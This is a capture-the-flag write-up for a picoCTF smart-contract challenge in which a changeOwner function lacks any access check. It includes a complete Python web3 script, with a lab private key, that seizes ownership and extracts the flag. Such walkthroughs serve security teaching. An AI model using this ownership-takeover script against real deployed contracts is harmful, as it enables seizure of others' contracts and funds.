Access_Control

Name: Access_Control
Description: We've created a simple contract to store a secret flag. But you currently are not the owner of the contract... Only the owner of the contract should be able to access it. We're sure we've made it secure this time. Contract: here The eth chain is at: Eth node address: lonely-island.picoctf.net:56743 More details can be found at here. Theory

According to the description, to get the flag we have to take ownership of the contract that we're given, then that way we can retrieve the flag, so for that we'll have to skip to the solution part to look at the contract and the details webpage we are given.

Solution

So if we look at this contract, so far it's not secure at all! If we look over here to this function:

function changeOwner(address _newOwner) public {
  address oldOwner = owner;
  owner = _newOwner;
  emit OwnerChanged(oldOwner, _newOwner);
}

There isn't any access control on this function that has the power to change ownership, which is what the challenge asks us to do. So what's happening is that, anybody can enter and call changeOwner to make themselves the owner. The exploit idea will be to first put ourselves as owners, then call the solve function, so that we can use the getFlag function, first we'll need our address, so let's look at the details webpage:

Perfect! Now we can start doing our code, first we'll initialize Web3 to see that we can connect. Then we'll enter the contract address and our private key. Then we'll enter our own contract, and finally we can use that to send transactions alongside our functions to get ownership, solve it from owner's address (us), and get the flag. So if we write all of that as a python script we get this:

from web3 import Web3

def send(tx):
  tx.update({
    "from": acc.address,
    "nonce": w3.eth.get_transaction_count(acc.address),
    "gas": 200000,
    "maxFeePerGas": w3.to_wei("2", "gwei"),
    "maxPriorityFeePerGas": w3.to_wei("1", "gwei"),
    "chainId": w3.eth.chain_id
  })

  signed = w3.eth.account.sign_transaction(tx, privkey)
  tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
  receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

  print(f"TX: {tx_hash.hex()}")
  return receipt

w3 = Web3(Web3.HTTPProvider("http://lonely-island.picoctf.net:56743"))
print("is connec:", w3.is_connected())

privkey = "0x383454a0b1498099f0e41520328f92ae4b30ed3fada6730f46a6d7763211e7e7"
addr = "0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9"
acc = w3.eth.account.from_key(privkey)
print(f"our addres: {acc.address}")

ABI = [{"inputs":[{"internalType":"address","name":"_newOwner","type":"address"}],"name":"changeOwner","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"solve","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"getFlag","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"}]

contract = w3.eth.contract(address=Web3.to_checksum_address(addr), abi=ABI)

print("\nbecome owner")
send(contract.functions.changeOwner(acc.address).build_transaction())
print("\nowner solves")
send(contract.functions.solve().build_transaction({"from": acc.address}))
print("\ntake flag")
print(contract.functions.getFlag().call())
